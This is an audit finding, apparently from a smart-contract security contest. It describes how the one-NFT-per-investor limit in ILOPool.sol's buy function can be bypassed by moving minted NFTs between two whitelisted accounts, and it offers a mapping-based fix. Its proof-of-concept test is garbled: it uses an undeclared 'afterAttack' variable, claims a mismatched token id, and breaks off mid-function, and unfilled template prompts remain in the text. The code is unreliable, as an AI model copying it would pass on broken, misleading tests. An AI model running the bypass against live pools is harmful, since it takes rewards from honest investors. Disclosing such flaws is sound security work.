# Vulnerability details

## Impact
Detailed description of the impact of this finding.
The buy function in ILOPool.sol is designed to limit users to minting just one NFT each. However, a critical vulnerability allows attackers to bypass this restriction and claim a majority of the rewards.
## Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.
The vulnerability lies in the following check : 
```
        // if investor already have a position, just increase raise amount and 
        liquidity
        // otherwise, mint new nft for investor and assign vesting schedules
        if (balanceOf(recipient) == 0) {
            _mint(recipient, (tokenId = _nextId++));
            _positionVests[tokenId].schedule = _vestingConfigs[0].schedule;
        } else {
            tokenId = tokenOfOwnerByIndex(recipient, 0);
        }

```
The contract aims to ensure that investors don't hold any NFTs before minting during the purchases. It achieves this by calling the balanceOf function of the ERC721 standard. However, there's a vulnerability. If an investor sends his NFT to another address, the balanceOf check on the recipient's address will return 0. This allows a malicious actor to bypass the restriction.

The exploit involves the attacker creating two Externally Owned Accounts (EOAs) and whitelisting both of them. During each purchase, the attacker would first buy an NFT with account 1 and then transfer it to account 2. By exploiting the balanceOf check, the attacker can claim multiple NFTs during the claiming period, unlike legitimate investors.

The following code simulates this attack scenario.

    function testAttackerMintsMultipleNFTs(address attacker1,address attacker2) external{
        uint256 tokenId;
        //assume that attacker owns 2 address 
        attacker1 = address(0x1);
        attacker2 = address(0x2);
        //save attacker's usdc balance
        uint256 beforeAttack = IERC20(USDC).balanceOf(attacker2);
        //attacker first mints saletoken nft with attacker2 eoa
        _prepareBuyFor(attacker2);
        (tokenId,) = _buyFor(attacker2, SALE_START + 1, 0.1 ether);
        //attacker mints more nft than he supposed to mint as transferring minted nfts to attacker2
        for(uint64 i=2;i<=7;i++){
            _prepareBuyFor(attacker1);
            (tokenId,) = _buyFor(attacker1, SALE_START + 1, 0.1 ether);
            vm.prank(attacker1);
            IERC721(iloPool).approve(attacker2, tokenId);
            vm.prank(attacker1);
            IERC721(iloPool).safeTransferFrom(attacker1,attacker2, tokenId);
        }
        //ensure that attacker minted 7 nfts 
        assertEq(IERC721(iloPool).balanceOf(attacker2), 7);
        //launch period starts

        //both attacker and investors claim their funds 
        vm.warp(VEST_START_0 + 10);

            vm.prank(attacker2);

         IILOPool(iloPool).claim(8);
          vm.prank(INVESTOR_2);

        assertGt(afterAttack,IERC20(USDC).balanceOf(INVESTOR_2));
        assertGt(afterAttack, beforeAttack);
    }
    function testBuyNoWhitelist() external {
        vm.prank(DUMMY_ADDRESS);
        IERC20(USDC).approve(iloPool, 1000000000 ether);
        vm.warp(SALE_START+1);
        _writeTokenBalance(USDC, DUMMY_ADDRESS, 10 ether);

        vm.expectRevert(bytes("UA"));
        IILOPool(iloPool).buy(0.1 ether, DUMMY_ADDRESS);
    }
    function _getListAddressFromAddress(address addr) internal pure returns (address[] memory addresses) {
        addresses = new address[](1);
        addresses[0] = addr;
    }
    function _launch() internal {
        _prepareBuyFor(INVESTOR);
        _buyFor(INVESTOR, SALE_START+1, 49000 ether);

        _buyFor(INVESTOR_2, SALE_START+1, 40000 ether);

        _writeTokenBalance(USDC, investor, 1000000000 ether);

## Recommended Mitigation Steps
The vulnerability can be fixed by adding a mapping object holds how many nft minted per investor address then checking if investor did not mint any nft as shown below: 
We first create the mapping as a global variable in the contract.Let's pretend that the mapping is implemented as following : ```mapping(address => uint256)private _mintedNfts;```
then change the check as the following code snippet in order to preventing malicious actors by minting multiple nfts:
```
if (_mintedNfts[recipient] == 0) {
            _mintedNfts[recipient]=1;
            _mint(recipient, (tokenId = _nextId++));
            _positionVests[tokenId].schedule = _vestingConfigs[0].schedule;
        } else {
            tokenId = tokenOfOwnerByIndex(recipient, 0);
        }
```
